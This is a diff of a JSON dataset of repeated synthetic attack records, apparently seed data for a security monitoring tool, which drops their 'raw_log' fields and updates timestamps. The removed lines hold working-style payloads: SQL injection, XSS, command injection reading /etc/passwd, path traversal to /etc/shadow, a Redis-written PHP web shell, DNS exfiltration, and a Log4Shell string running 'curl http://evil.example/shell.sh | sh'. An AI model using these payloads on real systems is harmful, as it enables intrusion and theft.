@@ -23,8 +23,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-001-sql_injection sql_injection from 198.51.100.10 to 10.0.0.20:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-002-xss",
@@ -50,8 +49,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-002-xss xss from 198.51.100.11 to 10.0.0.21:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-003-command_injection",
@@ -77,8 +75,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-003-command_injection command_injection from 198.51.100.12 to 10.0.0.22:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-004-path_traversal",
@@ -104,8 +101,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-004-path_traversal path_traversal from 198.51.100.13 to 10.0.0.23:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-005-ssh_bruteforce",
@@ -131,8 +127,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-005-ssh_bruteforce ssh_bruteforce from 198.51.100.14 to 10.0.0.24:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-006-dns_tunnel",
@@ -158,8 +153,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-006-dns_tunnel dns_tunnel from 198.51.100.15 to 10.0.0.25:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-007-ddos_http_flood",
@@ -185,8 +179,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-007-ddos_http_flood ddos_http_flood from 198.51.100.16 to 10.0.0.26:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-008-rce_payload",
@@ -212,8 +205,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-008-rce_payload rce_payload from 198.51.100.17 to 10.0.0.27:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-009-mongodb_probe",
@@ -239,8 +231,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-009-mongodb_probe mongodb_probe from 198.51.100.18 to 10.0.0.28:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-010-redis_abuse",
@@ -266,8 +257,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-010-redis_abuse redis_abuse from 198.51.100.19 to 10.0.0.29:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-011-sql_injection",
@@ -293,8 +283,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-011-sql_injection sql_injection from 198.51.100.20 to 10.0.0.30:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-012-xss",
@@ -320,8 +309,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-012-xss xss from 198.51.100.21 to 10.0.0.31:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-013-command_injection",
@@ -347,8 +335,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-013-command_injection command_injection from 198.51.100.22 to 10.0.0.32:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-014-path_traversal",
@@ -374,8 +361,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-014-path_traversal path_traversal from 198.51.100.23 to 10.0.0.33:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-015-ssh_bruteforce",
@@ -401,8 +387,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-015-ssh_bruteforce ssh_bruteforce from 198.51.100.24 to 10.0.0.34:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-016-dns_tunnel",
@@ -428,8 +413,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-016-dns_tunnel dns_tunnel from 198.51.100.25 to 10.0.0.35:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-017-ddos_http_flood",
@@ -455,8 +439,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-017-ddos_http_flood ddos_http_flood from 198.51.100.26 to 10.0.0.36:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-018-rce_payload",
@@ -482,8 +465,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-018-rce_payload rce_payload from 198.51.100.27 to 10.0.0.37:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-019-mongodb_probe",
@@ -509,8 +491,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-019-mongodb_probe mongodb_probe from 198.51.100.28 to 10.0.0.38:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-020-redis_abuse",
@@ -536,8 +517,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-020-redis_abuse redis_abuse from 198.51.100.29 to 10.0.0.39:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-021-sql_injection",
@@ -563,8 +543,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-021-sql_injection sql_injection from 198.51.100.30 to 10.0.0.40:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-022-xss",
@@ -590,8 +569,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-022-xss xss from 198.51.100.31 to 10.0.0.41:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-023-command_injection",
@@ -617,8 +595,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-023-command_injection command_injection from 198.51.100.32 to 10.0.0.42:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-024-path_traversal",
@@ -644,8 +621,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-024-path_traversal path_traversal from 198.51.100.33 to 10.0.0.43:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-025-ssh_bruteforce",
@@ -671,8 +647,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-025-ssh_bruteforce ssh_bruteforce from 198.51.100.34 to 10.0.0.44:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-026-dns_tunnel",
@@ -698,8 +673,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-026-dns_tunnel dns_tunnel from 198.51.100.35 to 10.0.0.45:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-027-ddos_http_flood",
@@ -725,8 +699,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-027-ddos_http_flood ddos_http_flood from 198.51.100.36 to 10.0.0.46:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-028-rce_payload",
@@ -752,8 +725,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-028-rce_payload rce_payload from 198.51.100.37 to 10.0.0.47:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-029-mongodb_probe",
@@ -779,8 +751,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-029-mongodb_probe mongodb_probe from 198.51.100.38 to 10.0.0.48:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-030-redis_abuse",
@@ -806,8 +777,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-030-redis_abuse redis_abuse from 198.51.100.39 to 10.0.0.49:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-031-sql_injection",
@@ -833,8 +803,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-031-sql_injection sql_injection from 198.51.100.40 to 10.0.0.20:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-032-xss",
@@ -860,8 +829,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-032-xss xss from 198.51.100.41 to 10.0.0.21:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-033-command_injection",
@@ -887,8 +855,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-033-command_injection command_injection from 198.51.100.42 to 10.0.0.22:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-034-path_traversal",
@@ -914,8 +881,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-034-path_traversal path_traversal from 198.51.100.43 to 10.0.0.23:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-035-ssh_bruteforce",
@@ -941,8 +907,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-035-ssh_bruteforce ssh_bruteforce from 198.51.100.44 to 10.0.0.24:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-036-dns_tunnel",
@@ -968,8 +933,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-036-dns_tunnel dns_tunnel from 198.51.100.45 to 10.0.0.25:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-037-ddos_http_flood",
@@ -995,8 +959,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-037-ddos_http_flood ddos_http_flood from 198.51.100.46 to 10.0.0.26:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-038-rce_payload",
@@ -1022,8 +985,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-038-rce_payload rce_payload from 198.51.100.47 to 10.0.0.27:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-039-mongodb_probe",
@@ -1049,8 +1011,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-039-mongodb_probe mongodb_probe from 198.51.100.48 to 10.0.0.28:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-040-redis_abuse",
@@ -1076,8 +1037,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-040-redis_abuse redis_abuse from 198.51.100.49 to 10.0.0.29:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-041-sql_injection",
@@ -1103,8 +1063,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-041-sql_injection sql_injection from 198.51.100.50 to 10.0.0.30:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-042-xss",
@@ -1130,8 +1089,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-042-xss xss from 198.51.100.51 to 10.0.0.31:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-043-command_injection",
@@ -1157,8 +1115,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-043-command_injection command_injection from 198.51.100.52 to 10.0.0.32:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-044-path_traversal",
@@ -1184,8 +1141,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-044-path_traversal path_traversal from 198.51.100.53 to 10.0.0.33:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-045-ssh_bruteforce",
@@ -1211,8 +1167,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-045-ssh_bruteforce ssh_bruteforce from 198.51.100.54 to 10.0.0.34:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-046-dns_tunnel",
@@ -1238,8 +1193,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-046-dns_tunnel dns_tunnel from 198.51.100.55 to 10.0.0.35:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-047-ddos_http_flood",
@@ -1265,8 +1219,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-047-ddos_http_flood ddos_http_flood from 198.51.100.56 to 10.0.0.36:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-048-rce_payload",
@@ -1292,8 +1245,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-048-rce_payload rce_payload from 198.51.100.57 to 10.0.0.37:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-049-mongodb_probe",
@@ -1319,8 +1271,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-049-mongodb_probe mongodb_probe from 198.51.100.58 to 10.0.0.38:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-050-redis_abuse",
@@ -1346,8 +1297,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-050-redis_abuse redis_abuse from 198.51.100.59 to 10.0.0.39:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-051-sql_injection",
@@ -1373,8 +1323,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-051-sql_injection sql_injection from 198.51.100.60 to 10.0.0.40:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-052-xss",
@@ -1400,8 +1349,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-052-xss xss from 198.51.100.61 to 10.0.0.41:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-053-command_injection",
@@ -1427,8 +1375,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-053-command_injection command_injection from 198.51.100.62 to 10.0.0.42:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-054-path_traversal",
@@ -1454,8 +1401,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-054-path_traversal path_traversal from 198.51.100.63 to 10.0.0.43:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-055-ssh_bruteforce",
@@ -1481,8 +1427,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-055-ssh_bruteforce ssh_bruteforce from 198.51.100.64 to 10.0.0.44:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-056-dns_tunnel",
@@ -1508,8 +1453,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-056-dns_tunnel dns_tunnel from 198.51.100.65 to 10.0.0.45:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-057-ddos_http_flood",
@@ -1535,8 +1479,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-057-ddos_http_flood ddos_http_flood from 198.51.100.66 to 10.0.0.46:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-058-rce_payload",
@@ -1562,8 +1505,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-058-rce_payload rce_payload from 198.51.100.67 to 10.0.0.47:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-059-mongodb_probe",
@@ -1589,8 +1531,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-059-mongodb_probe mongodb_probe from 198.51.100.68 to 10.0.0.48:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-060-redis_abuse",
@@ -1616,8 +1557,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-060-redis_abuse redis_abuse from 198.51.100.69 to 10.0.0.49:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-061-sql_injection",
@@ -1643,8 +1583,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-061-sql_injection sql_injection from 198.51.100.70 to 10.0.0.20:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-062-xss",
@@ -1670,8 +1609,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-062-xss xss from 198.51.100.71 to 10.0.0.21:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-063-command_injection",
@@ -1697,8 +1635,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-063-command_injection command_injection from 198.51.100.72 to 10.0.0.22:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-064-path_traversal",
@@ -1724,8 +1661,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-064-path_traversal path_traversal from 198.51.100.73 to 10.0.0.23:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-065-ssh_bruteforce",
@@ -1751,8 +1687,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-065-ssh_bruteforce ssh_bruteforce from 198.51.100.74 to 10.0.0.24:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-066-dns_tunnel",
@@ -1778,8 +1713,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-066-dns_tunnel dns_tunnel from 198.51.100.75 to 10.0.0.25:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-067-ddos_http_flood",
@@ -1805,8 +1739,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-067-ddos_http_flood ddos_http_flood from 198.51.100.76 to 10.0.0.26:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-068-rce_payload",
@@ -1832,8 +1765,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-068-rce_payload rce_payload from 198.51.100.77 to 10.0.0.27:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-069-mongodb_probe",
@@ -1859,8 +1791,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
